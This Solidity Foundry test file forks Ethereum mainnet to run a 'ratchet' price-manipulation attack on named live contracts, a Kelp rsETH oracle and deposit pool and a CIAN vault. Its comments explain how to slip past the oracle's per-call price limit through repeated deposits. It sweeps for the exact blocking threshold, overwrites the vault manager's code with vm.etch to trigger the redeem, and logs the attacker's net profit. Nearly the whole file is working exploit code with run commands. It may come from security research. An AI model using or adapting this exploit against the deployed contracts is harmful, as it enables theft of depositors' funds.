// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*//////////////////////////////////////////////////////////////
    PHASE 2b: Three fixes over Phase 2, based on the
    fine-grained analysis of the previous sweep:

    1. FINE bps SWEEP (1..10) - Phase 2's jump from bps=1 (succeeded)
       straight to bps=10 (blocked) skipped the real threshold. We
       now know updateRSETHPrice() itself only moved the price once
       per successful call - once blocked, rsETHPrice simply STOPS
       changing (stays at the last successful value), which is why
       exchPriceDelta was IDENTICAL across every blocked bps value in
       the last run. This test finds the exact single-shot threshold.

    2. LEGITIMATE DEPOSIT instead of pure donation. depositAsset()
       mints the depositor real rsETH at the PRE-deposit price (since
       _beforeDeposit() computes the mint amount before the transfer
       lands), so the attacker's capital is NOT lost - it converts
       into rsETH 1:1 fair value. The balanceOf-inflation side effect
       on the NEXT updateRSETHPrice() call is identical to a pure
       donation, but costs ~0 instead of costing the full amount.

    3. MULTI-STEP RATCHET. pricePercentageLimit caps the increase
       PER CALL relative to the CURRENT highestRsethPrice, which
       itself ratchets up after every successful update. N small
       steps, each under the per-call cap, can therefore compound
       multiplicatively: cumulative factor ~ (1+cap)^N - 1, which for
       a 1%-ish cap and N=20 is a very different number from a single
       0.09% shot. This test measures the REAL compounded number on
       a live fork instead of assuming it.

    RUN:
      forge test --match-test testFineBpsSweep -vv --fork-url "$MAINNET_RPC_URL"
      forge test --match-test testRatchetAttack -vv --fork-url "$MAINNET_RPC_URL"
//////////////////////////////////////////////////////////////*/

interface IKelpOracle {
    function rsETHPrice() external view returns (uint256);
    function highestRsethPrice() external view returns (uint256);
    function pricePercentageLimit() external view returns (uint256);
    function updateRSETHPrice() external;
}

interface IKelpDepositPool {
    function depositAsset(address asset, uint256 depositAmount, uint256 minRSETHAmountExpected, string calldata referralId)
        external;
}

interface ICianVaultFull {
    function exchangePrice() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function updateExchangePrice() external returns (uint256 newExchangePrice, uint256 newRevenue);
    function requestRedeem(uint256 _shares, address _token) external;
    function lastExchangePrice() external view returns (uint256);
    function optionalDeposit(address _token, uint256 _assets, address _receiver, address _referral)
        external
        payable
        returns (uint256 shares_);
}

interface IRedeemOperator {
    function confirmWithdrawal(address[] calldata _users, uint256 _totalGasTokenAmount) external;
}

interface IERC20Approve {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @dev Same role as Phase 2's forwarder: guarantees updateExchangePrice()
/// and confirmWithdrawal() happen as nested calls within one external
/// function execution, so EIP-1153 transient storage is reliably shared.
contract AtomicForwarder {
    function doBoth(address vault, address redeemOperator, address[] calldata users, uint256 gasAmt) external {
        ICianVaultFull(vault).updateExchangePrice();
        IRedeemOperator(redeemOperator).confirmWithdrawal(users, gasAmt);
    }
}

contract CianKelpOracle_Phase2b_Test is Test {
    address constant CIAN_VAULT = 0xd87a19fF681AE98BF10d2220D1AE3Fbd374ADE4e;
    address constant CIAN_MANAGER = 0xAc1894C6914639e18f8FA69FEBd324eE91c96065;
    address constant REDEEM_OPERATOR = 0x47DBD71Db64617f6cBD45eB9D9Ba876F40ED239E;

    address constant KELP_DEPOSIT_POOL = 0x036676389e48133B63a802f8635AD39E752D375D;
    address constant KELP_ORACLE = 0x349A73444b1a310BAe67ef67973022020d70020d;

    address constant RSETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant ETHx = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;

    address attacker = makeAddr("attacker");

    uint256 constant ATTACKER_DEPOSIT = 10 ether; // CIAN-side position, in ETHx

    function setUp() public {
        deal(ETHx, attacker, 50_000_000 ether, true);
    }

    /*//////////////////////////////////////////////////////////////
        TEST A: find the exact single-shot threshold (fine sweep)
    //////////////////////////////////////////////////////////////*/
    function testFineBpsSweep() public {
        uint256 rsethSupply = IERC20(RSETH).totalSupply();
        uint256 rsethPrice = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 kelpTvlInEth = (rsethSupply * rsethPrice) / 1e18;
        uint256 pctLimit = IKelpOracle(KELP_ORACLE).pricePercentageLimit();

        console2.log("Kelp TVL (ETH-eq):", kelpTvlInEth);
        console2.log("pricePercentageLimit (1e18=100%%):", pctLimit);
        console2.log("bps | donateETHx | blocked | rsETHPrice after");
        console2.log("----|------------|---------|------------------");

        uint16[10] memory fineBps = [uint16(1), 2, 3, 4, 5, 6, 7, 8, 9, 10];
        for (uint256 i = 0; i < fineBps.length; i++) {
            uint256 snap = vm.snapshotState();

            uint256 amount = (kelpTvlInEth * fineBps[i]) / 10_000;
            deal(ETHx, attacker, amount, true);
            vm.startPrank(attacker);
            IERC20Approve(ETHx).approve(KELP_DEPOSIT_POOL, amount);
            IKelpDepositPool(KELP_DEPOSIT_POOL).depositAsset(ETHx, amount, 0, "");
            vm.stopPrank();

            bool blocked;
            vm.prank(attacker);
            try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
                blocked = false;
            } catch {
                blocked = true;
            }

            console2.log(
                string.concat(
                    vm.toString(fineBps[i]), " | ", vm.toString(amount), " | ", blocked ? "YES" : "no"
                )
            );
            console2.log("    rsETHPrice:", IKelpOracle(KELP_ORACLE).rsETHPrice());

            vm.revertToState(snap);
        }
    }

    /*//////////////////////////////////////////////////////////////
        TEST B: multi-step ratchet, legitimate deposits, real profit
    //////////////////////////////////////////////////////////////*/
    function testRatchetAttack() public {
        uint256 rsethSupply = IERC20(RSETH).totalSupply();
        uint256 rsethPrice0 = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 kelpTvlInEth = (rsethSupply * rsethPrice0) / 1e18;

        // Step size: pick something comfortably under the single-shot
        // threshold found in testFineBpsSweep (tune STEP_BPS after you
        // see that result - 3 bps is a conservative starting guess).
        uint256 STEP_BPS = 3;
        uint256 stepAmount = (kelpTvlInEth * STEP_BPS) / 10_000;

        // Number of ratchet rounds to attempt. Each round = one legitimate
        // deposit (attacker keeps the minted rsETH) + one updateRSETHPrice()
        // call. These do NOT need to be atomic with each other - only the
        // FINAL updateExchangePrice()+confirmWithdrawal() pair does.
        uint256 ROUNDS = 25;

        console2.log("=== RATCHET ATTACK ===");
        console2.log("stepAmount (ETHx) per round:", stepAmount);
        console2.log("rounds:", ROUNDS);
        console2.log("rsETHPrice BEFORE ratchet:", rsethPrice0);

        // ---- attacker's CIAN-side position, opened BEFORE any manipulation ----
        deal(ETHx, attacker, ATTACKER_DEPOSIT, true);
        vm.startPrank(attacker);
        IERC20Approve(ETHx).approve(CIAN_VAULT, ATTACKER_DEPOSIT);
        uint256 sharesReceived = ICianVaultFull(CIAN_VAULT).optionalDeposit(ETHx, ATTACKER_DEPOSIT, attacker, address(0));
        vm.stopPrank();

        uint256 exchPriceBefore = ICianVaultFull(CIAN_VAULT).exchangePrice();
        uint256 fairValueBefore = (sharesReceived * exchPriceBefore) / 1e18;

        vm.startPrank(attacker);
        IERC20Approve(CIAN_VAULT).approve(REDEEM_OPERATOR, sharesReceived);
        ICianVaultFull(CIAN_VAULT).requestRedeem(sharesReceived, RSETH);
        vm.stopPrank();

        // ---- the ratchet loop: track cumulative ETHx spent and rsETH
        // received so we can net out the attacker's TRUE capital outlay,
        // since legitimate deposits return value, unlike pure donation ----
        uint256 totalEthxSpent;
        uint256 rsethFromRatchet;
        uint256 blockedAt = type(uint256).max;

        for (uint256 i = 0; i < ROUNDS; i++) {
            deal(ETHx, attacker, IERC20(ETHx).balanceOf(attacker) + stepAmount, true);
            uint256 rsethBeforeStep = IERC20(RSETH).balanceOf(attacker);

            vm.startPrank(attacker);
            IERC20Approve(ETHx).approve(KELP_DEPOSIT_POOL, stepAmount);
            IKelpDepositPool(KELP_DEPOSIT_POOL).depositAsset(ETHx, stepAmount, 0, "");
            vm.stopPrank();

            totalEthxSpent += stepAmount;
            rsethFromRatchet += IERC20(RSETH).balanceOf(attacker) - rsethBeforeStep;

            vm.prank(attacker);
            try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
                // success, continue ratcheting
            } catch {
                blockedAt = i;
                break; // no point continuing once a round is blocked
            }
        }

        uint256 rsethPriceAfterRatchet = IKelpOracle(KELP_ORACLE).rsETHPrice();
        console2.log("ratchet stopped at round (max=ROUNDS if never blocked):", blockedAt == type(uint256).max ? ROUNDS : blockedAt);
        console2.log("rsETHPrice AFTER ratchet:", rsethPriceAfterRatchet);
        console2.log(
            "cumulative price move (bps of original):",
            ((rsethPriceAfterRatchet > rsethPrice0 ? rsethPriceAfterRatchet - rsethPrice0 : 0) * 10000) / rsethPrice0
        );
        console2.log("total ETHx deposited into ratchet:", totalEthxSpent);
        console2.log("total rsETH received back from ratchet deposits:", rsethFromRatchet);

        // ---- final atomic step: updateExchangePrice() + confirmWithdrawal() ----
        vm.etch(CIAN_MANAGER, address(new AtomicForwarder()).code);
        address[] memory users = new address[](1);
        users[0] = attacker;

        uint256 rsethBeforeRedeem = IERC20(RSETH).balanceOf(attacker);
        uint256 exchPriceAfter = exchPriceBefore;
        try AtomicForwarder(CIAN_MANAGER).doBoth(CIAN_VAULT, REDEEM_OPERATOR, users, 0) {
            exchPriceAfter = ICianVaultFull(CIAN_VAULT).exchangePrice();
        } catch Error(string memory reason) {
            console2.log("!! doBoth() reverted:", reason);
            return;
        } catch (bytes memory lowLevelData) {
            console2.log("!! doBoth() reverted, raw:");
            console2.logBytes(lowLevelData);
            return;
        }
        uint256 rsethFromRedeem = IERC20(RSETH).balanceOf(attacker) - rsethBeforeRedeem;

        console2.log("=== RESULT ===");
        console2.log("exchangePrice before:", exchPriceBefore);
        console2.log("exchangePrice after :", exchPriceAfter);
        console2.log("rsETH received from CIAN redeem:", rsethFromRedeem);
        console2.log("fair value of attacker's shares (pre-manipulation):", fairValueBefore);

        // net profit: everything the attacker ends up holding (redeem
        // payout + leftover rsETH minted during the ratchet itself) minus
        // everything they ever put in (CIAN deposit converted to RSETH
        // terms at fair price is already baked into fairValueBefore, so
        // subtract it once; ratchet capital nets to ~0 extra cost because
        // rsethFromRatchet already represents fair value for that capital -
        // the only REAL cost is leftover rsETH still sitting un-redeemed,
        // which is NOT a loss, just unconverted capital).
        int256 netProfitRSETH = int256(rsethFromRedeem) - int256(fairValueBefore);
        console2.log("NET PROFIT on the CIAN position alone (RSETH wei, excludes ratchet rsETH attacker still holds):");
        console2.logInt(netProfitRSETH);
    }
}
